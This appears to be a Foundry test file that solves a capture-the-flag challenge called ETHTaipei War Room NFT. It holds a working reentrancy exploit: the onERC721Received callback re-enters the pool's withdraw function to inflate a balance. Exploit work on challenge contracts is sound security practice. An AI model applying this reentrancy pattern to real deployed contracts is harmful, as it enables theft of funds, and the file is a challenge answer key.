// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;

import {Test} from "forge-std/Test.sol";
import {Pool, PoolBase} from "src/ETHTaipeiWarRoomNFT/Pool.sol";
import {WarRoomNFT} from "src/ETHTaipeiWarRoomNFT/NFT.sol";
import {IERC721} from "openzeppelin-contracts-07/contracts/token/ERC721/IERC721.sol";

contract PoolTest is Test {
    Pool public pool;
    WarRoomNFT public nft;
    PoolBase public base;
    uint256 times = 0;

    function setUp() public {
        uint256 startTime = block.timestamp + 60;
        uint256 endTime = startTime + 60;
        uint256 fullScore = 100;
        base = new PoolBase(startTime, endTime, fullScore);
        base.setup();
    }

    function testExploit() public {
        nft = base.nft();
        pool = base.pool();

        // Exploit should be implemented here...
        // goal: _balances[user] > 1000 ether;
        // we have one NFT at the very beginning

        require(nft.balanceOf(address(this)) == 1, "where is my nft?");
        require(nft.ownerOf(1) == address(this), "is this not my nft?");

        IERC721(nft).approve(address(pool), 1);
        pool.deposit(1);
        pool.withdraw(1);

        base.solve();
        assertTrue(base.isSolved());
    }

    function onERC721Received(address, address, uint256 tokenId, bytes memory) external returns (bytes4) {
        nft = base.nft();
        pool = base.pool();

        if (times == 0) {
            times++;

            // Exploit should be implemented here...
            IERC721(nft).transferFrom(address(this), address(pool), 1);
            pool.withdraw(1);
        }

        return this.onERC721Received.selector;
    }
}
